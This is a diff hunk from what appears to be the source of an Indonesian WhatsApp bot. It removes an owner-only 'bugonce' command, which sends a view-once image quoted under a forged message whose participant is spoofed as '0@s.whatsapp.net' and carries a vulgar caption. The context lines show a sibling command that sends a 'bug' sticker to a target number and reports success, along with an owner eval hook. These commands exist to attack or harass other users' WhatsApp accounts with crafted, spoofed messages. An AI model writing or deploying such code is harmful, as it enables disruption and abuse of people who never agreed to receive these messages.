@@ -2472,25 +2472,6 @@ adehvn = {
 tebece.sendImageAsSticker(`${text}@s.whatsapp.net`, hey, adehvn, { packname: global.packname, author: global.author })
 await m.reply(`Berhasil Mengirim Bug Di Nomer ${text}@s.whatsapp.net`)
 break
-case 'bugonce':
-if (!isCreator) throw mess.owner
-adehvn = { 
-        key: { 
-            fromMe: false, 
-            participant: `0@s.whatsapp.net`, 
-            ...({ remoteJid: "" }) 
-        }, 
-        message: { 
-            "imageMessage": { 
-                "mimetype": "image/jpeg", 
-                "caption": `kontol`, 
-                "jpegThumbnail": thumb
-            } 
-        } 
-    }
- hey = thumb
-tebece.sendMessage(m.chat, {image: {url: hey},viewOnce : true},{quoted: adehvn })
-break
             default:
                 if (budy.startsWith('=>')) {
                     if (!isCreator) return m.reply(mess.owner)
